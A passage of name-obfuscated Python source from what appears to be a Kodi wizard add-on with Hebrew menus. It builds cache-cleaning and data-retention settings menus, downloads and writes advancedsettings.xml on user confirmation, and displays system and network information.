		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOOO00OOO0OO00O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOOO0O0OOOOO00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2884
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2885
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OO0O00OOO00OO0O .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2886
	if O0OO0O00OOO00OO0O =='true':#line:2887
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0O000O000OO0000O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('--- ניקוי קאש בהפעלה: %s'%O000OOOO0OO000OO0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOOO0O000O00O0OO0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO00O00O0O000O00O .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2891
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	addFile ('Include Video Cache in Clear Cache: %s'%O0OOO0OOOO000000O .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2893
	if O0OOO0OOOO000000O =='true':#line:2894
		addFile ('--- Include All Video Addons: %s'%O00OOOO0OOO0000O0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('--- Include Bob: %s'%O00O0O00000O0OOO0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2896
		addFile ('--- Include Phoenix: %s'%O0000O0O0O00O00O0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('--- Include Specto: %s'%OO0OOOO0O0000O0OO .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('--- Include Exodus: %s'%O000OO000OOO000OO .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('--- Include Salts: %s'%O00OOO000O0OOOOO0 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- Include Salts HD Lite: %s'%OOOOO000O0OOOOO00 .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- Include One Channel: %s'%OOOO000000O0O000O .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- Include Genesis: %s'%O0OOO000000O000OO .replace ('true',OO00O0O00OOO0O00O ).replace ('false',OOOO0000O000OOO0O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	setView ('files','viewType')#line:2906
def advancedWindow (url =None ):#line:2908
	if not ADVANCEDFILE =='http://':#line:2909
		if url ==None :#line:2910
			O00O0OOOO0000O0O0 =wiz .workingURL (ADVANCEDFILE )#line:2911
			O00OO0O0OO0OOO00O =uservar .ADVANCEDFILE #line:2912
		else :#line:2913
			O00O0OOOO0000O0O0 =wiz .workingURL (url )#line:2914
			O00OO0O0OO0OOO00O =url #line:2915
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		if os .path .exists (ADVANCED ):#line:2917
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2918
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		if O00O0OOOO0000O0O0 ==True :#line:2920
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2921
			O0OO00OOO0O0000OO =wiz .openURL (O00OO0O0OO0OOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2922
			OO0OOO0000000OO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO00OOO0O0000OO )#line:2923
			if len (OO0OOO0000000OO00 )>0 :#line:2924
				for O0O0OOOOO00OOOOO0 ,OO0OO0OO0OO00OOO0 ,url ,O0OO0OOO0OO0O00O0 ,O00O00O0OO0OO0OO0 ,O0O0O0OOOO0OOO0O0 in OO0OOO0000000OO00 :#line:2925
					if OO0OO0OO0OO00OOO0 .lower ()=="yes":#line:2926
						addDir ("[B]%s[/B]"%O0O0OOOOO00OOOOO0 ,'advancedsetting',url ,description =O0O0O0OOOO0OOO0O0 ,icon =O0OO0OOO0OO0O00O0 ,fanart =O00O00O0OO0OO0OO0 ,themeit =THEME3 )#line:2927
					else :#line:2928
						addFile (O0O0OOOOO00OOOOO0 ,'writeadvanced',O0O0OOOOO00OOOOO0 ,url ,description =O0O0O0OOOO0OOO0O0 ,icon =O0OO0OOO0OO0O00O0 ,fanart =O00O00O0OO0OO0OO0 ,themeit =THEME2 )#line:2929
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2930
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O0OOOO0000O0O0 )#line:2931
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2932
def writeAdvanced (OO0O00OOO0O0OOO0O ,O00OOO0O0O0OO0OO0 ):#line:2934
	O0OOOO000O0OOO0O0 =wiz .workingURL (O00OOO0O0O0OO0OO0 )#line:2935
	if O0OOOO000O0OOO0O0 ==True :#line:2936
		if os .path .exists (ADVANCED ):OOO0O0OOO0000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O00OOO0O0OOO0O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2937
		else :OOO0O0OOO0000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0O00OOO0O0OOO0O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2938
		if OOO0O0OOO0000OO0O ==1 :#line:2940
			OO000O0OO00O000OO =wiz .openURL (O00OOO0O0O0OO0OO0 )#line:2941
			OO00OO0000OO0O000 =open (ADVANCED ,'w');#line:2942
			OO00OO0000OO0O000 .write (OO000O0OO00O000OO )#line:2943
			OO00OO0000OO0O000 .close ()#line:2944
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2945
			wiz .killxbmc (True )#line:2946
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2947
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOOO000O0OOO0O0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2948
def viewAdvanced ():#line:2950
	O0O00O0000OO0OOOO =open (ADVANCED )#line:2951
	OO0O0OOO0OOO0OOOO =O0O00O0000OO0OOOO .read ().replace ('\t','    ')#line:2952
	wiz .TextBox (ADDONTITLE ,OO0O0OOO0OOO0OOOO )#line:2953
	O0O00O0000OO0OOOO .close ()#line:2954
def removeAdvanced ():#line:2956
	if os .path .exists (ADVANCED ):#line:2957
		wiz .removeFile (ADVANCED )#line:2958
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2959
def showAutoAdvanced ():#line:2961
	notify .autoConfig ()#line:2962
def getIP ():#line:2964
	O0OOO00O0OOO0O000 ='http://whatismyipaddress.com/'#line:2965
	if not wiz .workingURL (O0OOO00O0OOO0O000 ):return 'Unknown','Unknown','Unknown'#line:2966
	O0OOO0OOO0O0OO0O0 =wiz .openURL (O0OOO00O0OOO0O000 ).replace ('\n','').replace ('\r','')#line:2967
	if not 'Access Denied'in O0OOO0OOO0O0OO0O0 :#line:2968
		O0OOO000OOO00OO00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0OOO0OOO0O0OO0O0 )#line:2969
		OOOO0O00O0000000O =O0OOO000OOO00OO00 [0 ]if (len (O0OOO000OOO00OO00 )>0 )else 'Unknown'#line:2970
		OOO000O0O0OO000OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0OOO0OOO0O0OO0O0 )#line:2971
		OOO00OOO0O0OO00O0 =OOO000O0O0OO000OO [0 ]if (len (OOO000O0O0OO000OO )>0 )else 'Unknown'#line:2972
		O0O0OO0O000OOOOOO =OOO000O0O0OO000OO [1 ]+', '+OOO000O0O0OO000OO [2 ]+', '+OOO000O0O0OO000OO [3 ]if (len (OOO000O0O0OO000OO )>2 )else 'Unknown'#line:2973
		return OOOO0O00O0000000O ,OOO00OOO0O0OO00O0 ,O0O0OO0O000OOOOOO #line:2974
	else :return 'Unknown','Unknown','Unknown'#line:2975
def systemInfo ():#line:2977
	O00000O0OOO00O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2991
	O00OOOOOOOO0O000O =[];O0O0O000O00O00000 =0 #line:2992
	for O0OO0OOO0O000O0O0 in O00000O0OOO00O0O0 :#line:2993
		O000OO0O0OOOOO000 =wiz .getInfo (O0OO0OOO0O000O0O0 )#line:2994
		O00OO00OOO0OO0000 =0 #line:2995
		while O000OO0O0OOOOO000 =="Busy"and O00OO00OOO0OO0000 <10 :#line:2996
			O000OO0O0OOOOO000 =wiz .getInfo (O0OO0OOO0O000O0O0 );O00OO00OOO0OO0000 +=1 ;wiz .log ("%s sleep %s"%(O0OO0OOO0O000O0O0 ,str (O00OO00OOO0OO0000 )));xbmc .sleep (1000 )#line:2997
		O00OOOOOOOO0O000O .append (O000OO0O0OOOOO000 )#line:2998
		O0O0O000O00O00000 +=1 #line:2999
	OO0O00OO00OO0000O =O00OOOOOOOO0O000O [8 ]if 'Una'in O00OOOOOOOO0O000O [8 ]else wiz .convertSize (int (float (O00OOOOOOOO0O000O [8 ][:-8 ]))*1024 *1024 )#line:3000
	O0O0OOO00OOOOO00O =O00OOOOOOOO0O000O [9 ]if 'Una'in O00OOOOOOOO0O000O [9 ]else wiz .convertSize (int (float (O00OOOOOOOO0O000O [9 ][:-8 ]))*1024 *1024 )#line:3001
	O0OO0O00000O0OOOO =O00OOOOOOOO0O000O [10 ]if 'Una'in O00OOOOOOOO0O000O [10 ]else wiz .convertSize (int (float (O00OOOOOOOO0O000O [10 ][:-8 ]))*1024 *1024 )#line:3002
	OOOO0000OO0OOOOO0 =wiz .convertSize (int (float (O00OOOOOOOO0O000O [11 ][:-2 ]))*1024 *1024 )#line:3003
	OO0O0OO00OO0O0000 =wiz .convertSize (int (float (O00OOOOOOOO0O000O [12 ][:-2 ]))*1024 *1024 )#line:3004
	O0OOO000O0O00O0O0 =wiz .convertSize (int (float (O00OOOOOOOO0O000O [13 ][:-2 ]))*1024 *1024 )#line:3005
	OO0OOOO0O000OO0OO ,OOO0OO00OOO000O00 ,O0OO0O0O00O0000OO =getIP ()#line:3006
	OOO000OOO00OO0O0O =[];OOOOOOOOOOO00O000 =[];O00OOOOO000O0OOO0 =[];O0OOO0000OOO0O000 =[];OOO0O00O0O00OOOO0 =[];OO00000O0O00OO0O0 =[];O0OOOOO0OOOOOO0OO =[]#line:3008
	OO00O0O000OOO0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3010
	for O0OOOOOO0000O000O in sorted (OO00O0O000OOO0OO0 ,key =lambda OOOOOO00O00OOOOO0 :OOOOOO00O00OOOOO0 ):#line:3011
		O0OOO000000OO000O =os .path .split (O0OOOOOO0000O000O [:-1 ])[1 ]#line:3012
		if O0OOO000000OO000O =='packages':continue #line:3013
		OO00OOOO000O0OO00 =os .path .join (O0OOOOOO0000O000O ,'addon.xml')#line:3014
		if os .path .exists (OO00OOOO000O0OO00 ):#line:3015
			O00O0O000000000O0 =open (OO00OOOO000O0OO00 )#line:3016
			O00OOO000O00O0O0O =O00O0O000000000O0 .read ()#line:3017
			OO00O00000O00OO0O =re .compile ("<provides>(.+?)</provides>").findall (O00OOO000O00O0O0O )#line:3018
			if len (OO00O00000O00OO0O )==0 :#line:3019
				if O0OOO000000OO000O .startswith ('skin'):O0OOOOO0OOOOOO0OO .append (O0OOO000000OO000O )#line:3020
				if O0OOO000000OO000O .startswith ('repo'):OOO0O00O0O00OOOO0 .append (O0OOO000000OO000O )#line:3021
				else :OO00000O0O00OO0O0 .append (O0OOO000000OO000O )#line:3022
			elif not (OO00O00000O00OO0O [0 ]).find ('executable')==-1 :O0OOO0000OOO0O000 .append (O0OOO000000OO000O )#line:3023
			elif not (OO00O00000O00OO0O [0 ]).find ('video')==-1 :O00OOOOO000O0OOO0 .append (O0OOO000000OO000O )#line:3024
			elif not (OO00O00000O00OO0O [0 ]).find ('audio')==-1 :OOOOOOOOOOO00O000 .append (O0OOO000000OO000O )#line:3025
			elif not (OO00O00000O00OO0O [0 ]).find ('image')==-1 :OOO000OOO00OO0O0O .append (O0OOO000000OO000O )#line:3026
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3028
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3029
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3030
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3031
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3032
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3033
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3035
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3036
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3037
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00OO00OO0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO00OOOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3041
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O00000O0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3042
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0000OO0OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OO00OO0O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O000OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO00OOO000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0O00O0000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOOOOOO0O000O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	OOOO0000O0O0000OO =len (OOO000OOO00OO0O0O )+len (OOOOOOOOOOO00O000 )+len (O00OOOOO000O0OOO0 )+len (O0OOO0000OOO0O000 )+len (OO00000O0O00OO0O0 )+len (O0OOOOO0OOOOOO0OO )+len (OOO0O00O0O00OOOO0 )#line:3056
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOO0000O0O0000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOOOO000O0OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0000OOO0O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOOOOOO00O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000OOO00OO0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O00O0O00OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOOO0OOOOOO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00000O0O00OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
def Menu ():#line:3065
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3066
def saveMenu ():#line:3068
	O00O0OOO0000OO0O0 ='[COLOR yellow]מופעל[/COLOR]';OOO00O0O0O00OO00O ='[COLOR blue]מבוטל[/COLOR]'#line:3070
	O0O0000000O0000O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3071
	OO0O0OO0O0OOO0000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3072
	O00O0O000O0O0OOOO ='true'if KEEPINFO =='true'else 'false'#line:3073
	OOO00O0OOOO0O00OO ='true'if KEEPSOUND =='true'else 'false'#line:3075
	O00O0OO000OO0O0O0 ='true'if KEEPVIEW =='true'else 'false'#line:3076
	OO0O0000O0O00O000 ='true'if KEEPSKIN =='true'else 'false'#line:3077
	O000OOO0OOO000000 ='true'if KEEPSKIN2 =='true'else 'false'#line:3078
	OOO0O00O000O0OO0O ='true'if KEEPSKIN3 =='true'else 'false'#line:3079
	O00000OOOO0000000 ='true'if KEEPADDONS =='true'else 'false'#line:3080
	O0OO0O000OOOOOO0O ='true'if KEEPPVR =='true'else 'false'#line:3081
	O0O0OO0000OOOOO00 ='true'if KEEPTVLIST =='true'else 'false'#line:3082
	O0000O0O0O0O00OO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3083
	OOO0O00O0OOOOO000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3084
	O00O0OOO0O0OO0OO0 ='true'if KEEPHUBTV =='true'else 'false'#line:3085
	O000000O000OO0OOO ='true'if KEEPHUBVOD =='true'else 'false'#line:3086
	OOO0OOOOOO0O0OOOO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3087
	OOO0OOO00OO0O0OO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3088
	OO0OOOOO0000OOOO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3089
	OO0OO0O00O00O0O0O ='true'if KEEPHUBMENU =='true'else 'false'#line:3090
	OOO000O00000OOO0O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3091
	O0000O0O000000OO0 ='true'if KEEPTRAKT =='true'else 'false'#line:3092
	O0O0O0OO00000O0OO ='true'if KEEPREAL =='true'else 'false'#line:3093
	O0OO0OO0O0O0000OO ='true'if KEEPRD2 =='true'else 'false'#line:3094
	OOO0O000O0000O0O0 ='true'if KEEPTORNET =='true'else 'true'#line:3095
	O000O0OO000OOO0OO ='true'if KEEPLOGIN =='true'else 'false'#line:3096
	OOOOOOOOOOOOOOO0O ='true'if KEEPSOURCES =='true'else 'false'#line:3097
	OOO0OOO000OOO0000 ='true'if KEEPADVANCED =='true'else 'false'#line:3098
	O0OO000O0OOO00OOO ='true'if KEEPPROFILES =='true'else 'false'#line:3099
	O0OOOOOO0OO0000OO ='true'if KEEPFAVS =='true'else 'false'#line:3100
	O0OO0O000O00O0000 ='true'if KEEPREPOS =='true'else 'false'#line:3101
	OOOOO00O0O00OO0O0 ='true'if KEEPSUPER =='true'else 'false'#line:3102
	O0O0OOOO0OOO00OOO ='true'if KEEPWHITELIST =='true'else 'false'#line:3103
	O0OO00OOO0OO0OO0O ='true'if KEEPWEATHER =='true'else 'false'#line:3104
	if O0O0OOOO0OOO00OOO =='true':#line:3108
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3109
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3110
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3111
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3112
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3113
	addFile ('%s התקנת קיר סרטים: '%O0O0000000O0000O0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3115
	addFile ('%s שמירת חשבון RD:  '%O0O0O0OO00000O0OO .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3116
	addFile ('%s שמירת חשבון טראקט:  '%O0000O0O000000OO0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3117
	addFile ('%s שמירת מועדפים:  '%O0OOOOOO0OO0000OO .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OO0O000OOOOOO0O .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3121
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0O0OO0000OOOOO00 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3122
	addFile ('%s שמירת אריח סרטים:  '%O0000O0O0O0O00OO0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3123
	addFile ('%s שמירת אריח סדרות:  '%OOO0O00O0OOOOO000 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3124
	addFile ('%s שמירת אריח טלויזיה:  '%O00O0OOO0O0OO0OO0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O000000O000OO0OOO .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3126
	addFile ('%s שמירת אריח ספורט:  '%OOO0OOOOOO0O0OOOO .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת אריח ילדים:  '%OOO0OOO00OO0O0OO0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת אריח מוסיקה:  '%OO0OOOOO0000OOOO0 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO0OO0O00O00O0O0O .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת כל האריחים בסקין:  '%OO0O0000O0O00O000 .replace ('true',O00O0OOO0000OO0O0 ).replace ('false',OOO00O0O0O00OO00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3131
